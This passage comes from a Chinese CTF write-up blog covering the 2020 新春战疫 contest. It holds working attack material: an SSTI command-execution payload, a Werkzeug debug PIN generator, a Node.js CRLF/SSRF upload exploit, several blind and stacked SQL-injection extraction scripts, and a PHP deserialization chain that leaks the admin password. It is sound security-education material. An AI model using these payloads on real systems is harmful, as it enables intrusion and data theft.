'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&apos;ls /&apos;).read() 翔哥的方法：直接绕waf命令执行 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;sys&apos;+&apos;tem&apos;](&apos;ls /&apos;)&#125;&#125; 没有回显，反弹shell即可 node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload 本地测一下 123456#使用npm 安装一个模块 n 到全局npm install -g n#使用 n 加版本号就可以安装其他版本n 8.12.0#再使用 n ，通过上下键，就可以选择不同的版本n wireshark里面是这样的 也就是说payload有问题，并没有实现CRLF注入，但是不知道哪有问题。。 Express文件上传，查看参数内容，等下构造包的时候方便些 123var file_path = &apos;/uploads/&apos; + req.files[0].mimetype +&quot;/&quot;;var file_name = req.files[0].originalnamevar dir_file = __dirname + file_path + file_name 作罢 ======================分割线 赵师傅发了脚本，CRLF的编码和wp不太一样 原理： https://xz.aliyun.com/t/2894 在nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入chr(0xffa0)处理后会被截断为chr(0xa0)，并且这个0xff可更换 测试CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) 但是打题目和本地还是失败，依旧是304，我丢，再用脚本发包发现可以，猜测原因可能是bp发送GET请求中有这些非可见字符的时候可能会出错 返回200，返回源码 既然CSRF注入成功，配合SSRF上传文件 之前看源码发现我们可控文件路径，但是还需要访问 123456789app.get(&apos;/&apos;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &apos;/template/&apos;+ action +&apos;.pug&apos;); var html = pug.renderFile(file); res.send(html);&#125;); 上传a.pug到/template下即可 pug语法： https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ../../../../../../flag.txt 修改源码把ip限制去掉抓包 123456789101112131415161718POST /file_upload HTTP/1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart/form-data; boundary=---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;Content-Type: /../templatedoctype htmlhtml head body include ../../../../../../flag.txt-----------------------------2995119424827-- 结合CRLF 123456789101112131415161718192021222324252627payload = &apos;&apos;&apos; HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart/form-data; boundary=---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;Content-Type: /../templatedoctype htmlhtml head body include ../../../../../../flag.txt-----------------------------2995119424827--GET /file_upload HTTP/1.1Host: xConnection: closex:&apos;&apos;&apos; 最后访问 这里发包格式还是挺细的，可以通过wireshark分析排查，比如一开始我出现过下面的解析错误 ezExpress明显的JavaScript原型链污染 留下了不学无术的眼泪.jpg =================分割线 JavaScript原型链污染： https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinking应该是tp框架，提示Vulnerability Search，可能是搜索功能有问题 产生报错 tp6.0，应该会给源码，扫了下，发现www.zip https://paper.seebug.org/1114/ 猜测是搜索记录是data，sessionid是文件名，想本地测试下，发现运行报错 [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 对照tp6文件，先将index.php移到public中，再修改 require __DIR__ . &#39;/../vendor/autoload.php&#39;; 又报错 模板文件不存在:public/static/tamplate/index\\index.html 但是明明路径没错，查看配置 config/view.php修改view_dir_name为public 修改app/home/config/view.php为static/tamplate/ 总算能用了。。 在登录的时候设置session的时候修改sessionid，在查询的时候用这个sessionid即可添加任意内容 但是这样访问不到，需要写入app/home/controller/a.php下， 构造../../../../app/home/controller/a.php 长度37 也没有文件包含的地方。。遂作罢 正解就是题目环境直接访问就行。。 因为我本地修改了一些配置导致无法访问。。但是不改调试不了。。 最后还需要bypassdisable_func，需要执行/readflag 这个做过几次，过滤了很多，包括mail()等 https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-2","slug":"2020新春战疫-网络安全公益赛-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-23T08:23:23.089Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020新春战疫-网络安全公益赛-2/","excerpt":"","text":"放上我xxxxx easysqli_copy看到PDO+set names gbk 就想到宽字节注入，之前看过的文章 从宽字节注入认识PDO的原理和正确使用：https://www.freebuf.com/articles/web/216336.html 简单测试了下，发现可以，但是过滤了select，我简单测试了下发现存在堆叠注入，没有过滤=，万事大吉 1234select hex(&apos;select sleep(5)&apos;);set @a=0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id=1%df&apos;;set%20@a=0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; 脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); emm，这个黑名单似乎可以用昨天的exp打。。。 1inject=1&apos;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 需要先利用堆叠注入查询表和字段 11&apos;;show tables;# 得到FlagHere 11&apos;; show columns from `FlagHere`; # 得到flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 还有个问题，就是利用昨天的方法只能查当前表，而flag在另一张表中。 遂作罢 https://www.4hou.com/posts/mM60 骚操作：handler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&apos;;handler FlagHere open as a;handler a READ first;# 得到flag Ezsqlibp跑一下sql字典 不是200就是500,500的是语法错误，其实过滤字符的并不多 数字型，有回显考虑盲注，简单构造了下成了 bp跑一下发现c的时候Hello Nu1L 数据库为ctf,mysql版本为5.7.1 发现innodb也被过滤。。 聊一聊bypass information_schema：https://www.anquanke.com/post/id/193512 前提要是mysql ≥ 5.7版本 新特性sys.schema_auto_increment_columns也被过滤。。 1select table_name from sys.schema_auto_increment_columns where table_schema=&apos;ctf&apos; 还有另一种 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer 成功得到了表名users233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh 报500错误，说明不止1列。。。猜了几个字段也不行==！无列名注入实在搞不出来。。 正解 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) 有个缺陷，就是不区分大小写。。 https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg 预期解是文章中提到的使用 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 来另其返回二进制字符串，从而区分大小写。 测试了一下 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 需要mysql&gt;=5.7 对于sys.x$schema_table_statistics_with_buffer是视图，所以一开始本地没找到==！ 视图是在基本表之上建立的表，它的结构（即所定义的列）和内容（即所有记录）都来自基本表，它依据基本表存在而存在。一个视图可以对应一个基本表，也可以对应多个基本表。视图是基本表的抽象和在逻辑意义上建立的新关系。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-1","slug":"2020新春战疫-网络安全公益赛-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-23T08:23:45.323Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020新春战疫-网络安全公益赛-1/","excerpt":"","text":"最近做啥都没耐心==！ 盲注给了源码，简单测一下过滤内容 select被过滤！！以及= like等，可用regexp 没有回显考虑时间盲注。select被过滤，我通常两种办法， 不用select（只能查当前表）11 and if(1,sleep(5),1) 成功延时 121 and if(database() regexp(&apos;^&apos;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) 一开始不知道为啥跑到flag{就断了，索性加个hex()，就好了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) 第二种，利用堆叠注入，16进制+mysql预处理 堆叠注入： https://www.jianshu.com/p/36f0772f5ce8 先判断能否堆叠注入，既然不能用select，用show代替 11;show tables;# 发现没有报500，应该可以堆叠注入 3种payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &apos; * from `1919810931114514` &apos;);EXECUTE jwt;# 1SET @sql=concat(char(115,101,108,101,99,116),&apos;* from `1919810931114514`&apos;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&apos;s&apos;,&apos;elect&apos;, &apos; * from `1919810931114514` &apos;);EXECUTE jwt;# 但是我本地测试时只有第二个能执行，而第二个恰恰使用了= 猜测是版本问题，先去看了原题 简单来说，MariaDB是MySQL源代码的一个分支 , MariaDB包括的一些新特性使它优于MySQL。 MariaDB跟MySQL在绝大多数方面是兼容的，对于开发者来说，几乎感觉不到任何不同。 然后我把本地mysql版本切到mysql8.0.12，已选择执行是正常的，整个执行还是一样不行 想直接在题目上打一打试试，发现环境已经关了，遂作罢 babyphpwww.zip源码泄露，代码审计，思路很明确， 1234if($_SESSION[&apos;login&apos;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; 需要成功登录admin， 寻找反序列化入口， 123456789101112public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&apos;id&apos;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&apos;id&apos;]); //这个功能还没有写完 先占坑&#125;public function getNewInfo()&#123; $age=$_POST[&apos;age&apos;]; $nickname=$_POST[&apos;nickname&apos;]; return safe(serialize(new Info($age,$nickname)));&#125; 正常情况下这里的反序列化我们只能控制Info类的两个属性，但是这里通过safe()方法可以逃逸字符，甚至还可以逃逸对象 思路一、 User-&gt;__destruct()读取flag.php 但是很快就发现行不通。首先是return，不会打印出来，其次flag被过滤替换成hacker 思路二、 注出admin密码登陆后查看 UpdateHelper类-&gt;__destruct() User类-&gt;toString() Info类-&gt;__call() dbCtrl类-&gt;login() 构造一个正常的payload，比如POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 测试逃逸，比如逃逸出$CtrlCase的值为haha， 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; 需要逃逸29个字符，&#39;-&gt;hacker逃逸5个字符,构造5个单引号和4个union POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} 下面是序列化内容 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 再举个逃逸对象的例子 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63个逃逸字符-12个单引号和3个union，这里要注意的是题目中flag也被替换成hacker 在构造前分析下sql 123456789$result=$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&apos;s&apos;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token==&apos;admin&apos;) &#123; return $idResult;&#125; 返回结果集中的$idResult，查询的时候把第一个参数改为password即可 1select password,id from user where username=? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; 得到 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;&#125;&#125; 满足格式 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;&#125;&#125;&#125; 365位，73个单引号 1age=&amp;nickname=&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;&#125;&#125;&#125; md5解密登录即可 参考链接: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"。即是终点也是起点","categories":[],"tags":[]}]}